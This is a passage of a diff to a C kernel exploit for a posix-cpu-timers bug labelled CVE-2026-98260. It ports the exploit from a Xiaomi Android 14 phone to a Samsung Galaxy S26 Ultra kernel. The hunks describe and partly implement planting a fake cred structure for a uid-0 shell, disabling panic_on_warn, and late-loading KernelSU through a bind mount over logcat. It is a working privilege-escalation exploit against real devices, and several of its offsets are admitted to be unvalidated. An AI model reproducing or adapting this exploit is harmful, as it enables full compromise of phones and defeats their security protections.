@@ -1,17 +1,17 @@
 /*
  * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
- * Target : Xiaomi aurora (SM8650), Android 14
- * Kernel : 6.1.75-android14-11-gfa9b7054770e-mi
- * Build  : AQ3A.240627.003
+ * Target : Samsung Galaxy S26 Ultra (SM-S948U), Snapdragon 8 Elite for Galaxy (SM8750)
+ * Kernel : 6.12.69-android16-6-p342046c-abogkiS948USQS6BZK4-4k
+ * Build  : S948USQS6BZK4 (AP_S948USQS6BZK4_S948USQS6BZK4_MQB117038647_REV00_user_low_ship_MULTI_CERT_meta_OS17)
  * SELinux: Enforcing
  * Patches: absent
- * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
+ * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on (device-dependent hardening applies)
  *
- * Ported from the 6.12.69 (android16-6) profile.  Every address and struct
- * offset below was re-derived from this image's .symtab, .BTF and
- * disassembly; the 6.1 cred layout differs (4-byte usage, uid at 4), the
- * fake erase must stay self-parent so the exit loop's rb_next() returns
- * NULL, and uid/euid need two repair writes afterwards.
+ * Ported for this SM-S948U 6.12.69 (android16-6) kernel profile.  Device-
+ * specific addresses/offsets live in offsets.h; some values are confirmed
+ * from the firmware vmlinux while others require on-device tracefs/runtime
+ * validation before reliable exploitation.  The fake erase must stay
+ * self-parent so the exit loop's rb_next() returns NULL.
  *
  * Adapted from woshigenm/CVE-2026-98260 (MIT) and the other 98260 ports.
  * The trigger, slab layout and offsets are the same; the do_timer_create
@@ -29,8 +29,9 @@
  *     order-1 page, then fix uid/gid.  The child forks a worker; fork's
  *     prepare_creds() normalizes cred/real_cred and allocates a real SELinux
  *     blob.  The worker execs ksud late-load, which resolves the installed
- *     manager's libksud.so and loads the matching android14-6.1 module.
- *     The parent parks with its socket buffers holding the fake cred page.
+ *     manager's libksud.so and loads the matching KernelSU module for this
+ *     kernel.  The parent parks with its socket buffers holding the fake
+ *     cred page.
  *
  * The trigger leaves a stale timerqueue node; every failed plant parks
  * without reaping (a reaped uncontrolled node panics this kernel).  Reboot
@@ -1287,10 +1288,8 @@ static void write_ksu_script(void)
         "fi\n"
         /* If the C-side bind mount worked, /system/bin/logcat IS ksud
          * (KDP-safe path).  Real logcat never prints ksud/KernelSU.
-         * No --ephemeral: the e1s pair's ksud does not have that option
-         * (verified: late-load --help lists only magica/allow-shell/
-         * post-magica/kmi/package-name); plain late-load performs the
-         * full install, which is the device-tested flow for these pairs. */
+         * No --ephemeral by default: some ksud builds do not support that
+         * option; plain late-load is used for broad compatibility. */
         "if /system/bin/logcat --version 2>/dev/null | "
         "grep -qiE 'ksud|kernelsu'; then\n"
         "  echo '[ksu] bind mount active, exec via logcat path'\n"
@@ -2124,7 +2123,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
              * WARN_ON_ONCE(RB_EMPTY_NODE) in timerqueue_del; calling it is
              * safe because the fake path pre-zeroes panic_on_warn.
              *
-             * After the erase (6.1 cred layout):
+             * After the erase (kernel cred layout):
              *   +0x00 usage|uid = parent color A (uid is dirty)
              *   +0x08 gid|suid  = target, written by __rb_change_child
              *   +0x10 sgid|euid = rb_left (target)
@@ -3217,9 +3216,9 @@ static int umhpipe_main(unsigned char *raw)
     memset(&r, 0, sizeof(r));
 
     /*
-     * e1s runs with panic_on_warn=1; the self-parent (RB_EMPTY_NODE)
-     * plants take timerqueue_del()'s WARN_ON_ONCE, so the warning must be
-     * defused before the first plant.  The stage script restores it.
+     * Some kernels run with panic_on_warn=1; self-parent (RB_EMPTY_NODE)
+     * plants can trigger timerqueue_del() WARN_ON_ONCE, so defuse the
+     * warning before the first plant.  The stage script restores it.
      */
     if (stage_write(0, 0, "panic_on_warn", raw, NULL, PANIC_ON_WARN_STATIC))
         park_forever("panic_on_warn pre-plant failed");
